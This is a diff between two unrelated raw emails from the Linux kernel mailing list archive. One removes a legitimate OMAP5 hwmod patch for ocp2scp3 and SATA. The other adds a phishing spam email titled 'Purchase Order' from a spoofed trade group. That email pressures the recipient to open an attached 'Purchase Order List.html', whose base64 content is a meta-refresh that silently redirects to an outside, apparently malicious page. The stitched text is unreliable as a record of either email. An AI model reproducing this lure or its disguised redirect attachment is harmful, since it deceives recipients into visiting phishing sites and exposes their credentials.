@@ -1,137 +1,59 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1752550AbaCGKQG (ORCPT <rfc822;w@1wt.eu>);
-	Fri, 7 Mar 2014 05:16:06 -0500
-Received: from arroyo.ext.ti.com ([192.94.94.40]:35031 "EHLO arroyo.ext.ti.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1751822AbaCGKQB (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Fri, 7 Mar 2014 05:16:01 -0500
-From: Roger Quadros <rogerq@ti.com>
-To: <balbi@ti.com>, <tony@atomide.com>
-CC: <kishon@ti.com>, <george.cherian@ti.com>, <balajitk@ti.com>,
-        <hdegoede@redhat.com>, <linux-omap@vger.kernel.org>,
-        <linux-arm-kernel@lists.infradead.org>, <linux-kernel@vger.kernel.org>,
-        <devicetree@vger.kernel.org>, <linux-usb@vger.kernel.org>,
-        <rogerq@ti.com>, Benoit Cousson <bcousson@baylibre.com>,
-        Paul Walmsley <paul@pwsan.com>
-Subject: [PATCH v3 5/8] ARM: OMAP5: hwmod: Add ocp2scp3 and sata hwmods
-Date: Fri, 7 Mar 2014 12:15:05 +0200
-Message-ID: <1394187308-19622-6-git-send-email-rogerq@ti.com>
-X-Mailer: git-send-email 1.8.3.2
-In-Reply-To: <1394187308-19622-1-git-send-email-rogerq@ti.com>
-References: <1394187308-19622-1-git-send-email-rogerq@ti.com>
+	id S1753029AbaCGKSN (ORCPT <rfc822;w@1wt.eu>);
+	Fri, 7 Mar 2014 05:18:13 -0500
+Received: from www2021.sakura.ne.jp ([59.106.171.31]:50875 "EHLO
+	www2021.sakura.ne.jp" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1752735AbaCGKSJ (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Fri, 7 Mar 2014 05:18:09 -0500
+X-Greylist: delayed 9346 seconds by postgrey-1.27 at vger.kernel.org; Fri, 07 Mar 2014 05:18:09 EST
+X-Nat-Received: from [59.106.171.31]:56876 [ident-empty]
+	by smtp-proxy.isp with TPROXY id 1394177877.20805
+Message-Id: <201403070737.s277bJla090963@www2021.sakura.ne.jp>
+Reply-To: <info@marvinyoung.co.za>
+From: "Newton brothers trade group" <toiawase@ajac.gr.jp>
+Subject: Purchase Order ... Kindly download to view our purchasing order?
+Date: Thu, 6 Mar 2014 23:37:55 -0800
 MIME-Version: 1.0
-Content-Type: text/plain
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0081_01C2A9A6.110C3256"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients:;
+X-Anti-Virus: Kaspersky Anti-Virus for Linux Mail Server 5.6.45.2/RELEASE, bases: 07032014 #7427424, status: clean
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-From: Keshava Munegowda <keshava_mgowda@ti.com>
+This is a multi-part message in MIME format.
 
-Create hwmods for ocp2scp3 and sata modules.
+------=_NextPart_000_0081_01C2A9A6.110C3256
+Content-Type: text/plain;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
 
-[Roger Q] Clean up.
+Good Day,
+We already made the balance payment on friday, find attachment tt Slip please courier us Bill of landing 
 
-CC: Benoit Cousson <bcousson@baylibre.com>
-CC: Paul Walmsley <paul@pwsan.com>
-CC: Tony Lindgren <tony@atomide.com>
-Signed-off-by: Balaji T K <balajitk@ti.com>
-Signed-off-by: Roger Quadros <rogerq@ti.com>
----
- arch/arm/mach-omap2/omap_hwmod_54xx_data.c | 73 ++++++++++++++++++++++++++++++
- 1 file changed, 73 insertions(+)
+asap. waiting for your reply urgently.
 
-diff --git a/arch/arm/mach-omap2/omap_hwmod_54xx_data.c b/arch/arm/mach-omap2/omap_hwmod_54xx_data.c
-index e297d62..227a69f 100644
---- a/arch/arm/mach-omap2/omap_hwmod_54xx_data.c
-+++ b/arch/arm/mach-omap2/omap_hwmod_54xx_data.c
-@@ -1726,6 +1726,77 @@ static struct omap_hwmod omap54xx_wd_timer2_hwmod = {
- 	},
- };
- 
-+/*
-+ * 'ocp2scp' class
-+ * bridge to transform ocp interface protocol to scp (serial control port)
-+ * protocol
-+ */
-+/* ocp2scp3 */
-+static struct omap_hwmod omap54xx_ocp2scp3_hwmod;
-+/* l4_cfg -> ocp2scp3 */
-+static struct omap_hwmod_ocp_if omap54xx_l4_cfg__ocp2scp3 = {
-+	.master		= &omap54xx_l4_cfg_hwmod,
-+	.slave		= &omap54xx_ocp2scp3_hwmod,
-+	.clk		= "l4_root_clk_div",
-+	.user		= OCP_USER_MPU | OCP_USER_SDMA,
-+};
-+
-+static struct omap_hwmod omap54xx_ocp2scp3_hwmod = {
-+	.name		= "ocp2scp3",
-+	.class		= &omap54xx_ocp2scp_hwmod_class,
-+	.clkdm_name	= "l3init_clkdm",
-+	.prcm = {
-+		.omap4 = {
-+			.clkctrl_offs = OMAP54XX_CM_L3INIT_OCP2SCP3_CLKCTRL_OFFSET,
-+			.context_offs = OMAP54XX_RM_L3INIT_OCP2SCP3_CONTEXT_OFFSET,
-+			.modulemode   = MODULEMODE_HWCTRL,
-+		},
-+	},
-+};
-+
-+/*
-+ * 'sata' class
-+ * sata:  serial ata interface  gen2 compliant   ( 1 rx/ 1 tx)
-+ */
-+
-+static struct omap_hwmod_class_sysconfig omap54xx_sata_sysc = {
-+	.sysc_offs	= 0x0000,
-+	.sysc_flags	= (SYSC_HAS_MIDLEMODE | SYSC_HAS_SIDLEMODE),
-+	.idlemodes	= (SIDLE_FORCE | SIDLE_NO | SIDLE_SMART |
-+			   SIDLE_SMART_WKUP | MSTANDBY_FORCE | MSTANDBY_NO |
-+			   MSTANDBY_SMART | MSTANDBY_SMART_WKUP),
-+	.sysc_fields	= &omap_hwmod_sysc_type2,
-+};
-+
-+static struct omap_hwmod_class omap54xx_sata_hwmod_class = {
-+	.name	= "sata",
-+	.sysc	= &omap54xx_sata_sysc,
-+};
-+
-+/* sata */
-+static struct omap_hwmod omap54xx_sata_hwmod = {
-+	.name		= "sata",
-+	.class		= &omap54xx_sata_hwmod_class,
-+	.clkdm_name	= "l3init_clkdm",
-+	.flags		= HWMOD_SWSUP_SIDLE | HWMOD_SWSUP_MSTANDBY,
-+	.main_clk	= "func_48m_fclk",
-+	.mpu_rt_idx	= 1,
-+	.prcm = {
-+		.omap4 = {
-+			.clkctrl_offs = OMAP54XX_CM_L3INIT_SATA_CLKCTRL_OFFSET,
-+			.context_offs = OMAP54XX_RM_L3INIT_SATA_CONTEXT_OFFSET,
-+			.modulemode   = MODULEMODE_SWCTRL,
-+		},
-+	},
-+};
-+
-+/* l4_cfg -> sata */
-+static struct omap_hwmod_ocp_if omap54xx_l4_cfg__sata = {
-+	.master		= &omap54xx_l4_cfg_hwmod,
-+	.slave		= &omap54xx_sata_hwmod,
-+	.clk		= "l3_iclk_div",
-+	.user		= OCP_USER_MPU | OCP_USER_SDMA,
-+};
- 
- /*
-  * Interfaces
-@@ -2399,6 +2470,8 @@ static struct omap_hwmod_ocp_if *omap54xx_hwmod_ocp_ifs[] __initdata = {
- 	&omap54xx_l4_cfg__usb_tll_hs,
- 	&omap54xx_l4_cfg__usb_otg_ss,
- 	&omap54xx_l4_wkup__wd_timer2,
-+	&omap54xx_l4_cfg__ocp2scp3,
-+	&omap54xx_l4_cfg__sata,
- 	NULL,
- };
- 
--- 
-1.8.3.2
 
+John lander
+purchase manager
+sales.department@techie.com
+
+------=_NextPart_000_0081_01C2A9A6.110C3256
+Content-Type: application/octet-stream;
+	name="Purchase Order List.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+	filename="Purchase Order List.html"
+
+DQoNCiZuYnNwOzxodG1sPg0KDQo8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNo
+IiBjb250ZW50PSIwOw0KdXJsPWh0dHA6Ly9tYXJ2aW55b3VuZy5jby56YS9p
+bWFnZS9wZGZwcm9kdWN0cy5odG1sIj4NCg0KDQo=
+
+------=_NextPart_000_0081_01C2A9A6.110C3256--
